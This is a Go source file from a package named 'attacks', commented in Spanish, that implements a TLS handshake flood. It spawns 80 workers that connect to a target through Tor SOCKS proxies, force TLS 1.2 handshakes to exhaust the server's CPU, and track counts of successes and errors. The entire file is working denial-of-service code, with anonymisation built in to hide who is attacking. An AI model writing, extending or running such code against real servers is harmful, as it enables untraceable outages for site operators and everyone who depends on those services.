package attacks

import (
	"context"
	"crypto/tls"
	"fmt"
	"sync/atomic"
	"time"
)

// TLSFlood agota la CPU del servidor con renegociaciones SSL
// Cada handshake TLS consume ~10-50ms de CPU en el servidor
// Miles de handshakes simultáneos = CPU exhaustion
func TLSFlood(ctx context.Context, host string, port int, torPorts []int, stats *Stats) {
	workers := 80
	if len(torPorts) == 0 {
		return
	}

	for i := 0; i < workers; i++ {
		torPort := torPorts[i%len(torPorts)]
		go tlsWorker(ctx, host, port, torPort, stats)
	}
}

func tlsWorker(ctx context.Context, host string, targetPort int, torPort int, stats *Stats) {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         host,
		// Forzar TLS 1.2 para maximizar overhead de handshake
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS12,
	}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			// TCP via Tor
			conn := dialViaSocks(torPort, host, targetPort)
			if conn == nil {
				time.Sleep(time.Second)
				continue
			}

			// Iniciar handshake TLS — consume CPU del servidor
			addr := fmt.Sprintf("%s:%d", host, targetPort)
			_ = addr
			tlsConn := tls.Client(conn, tlsConfig)
			tlsConn.SetDeadline(time.Now().Add(3 * time.Second))

			err := tlsConn.Handshake()
			tlsConn.Close()

			if err == nil {
				atomic.AddInt64(&stats.TLSFlood, 1)
				atomic.AddInt64(&stats.Total, 1)
			} else {
				atomic.AddInt64(&stats.Errors, 1)
			}

			time.Sleep(500 * time.Microsecond)
		}
	}
}
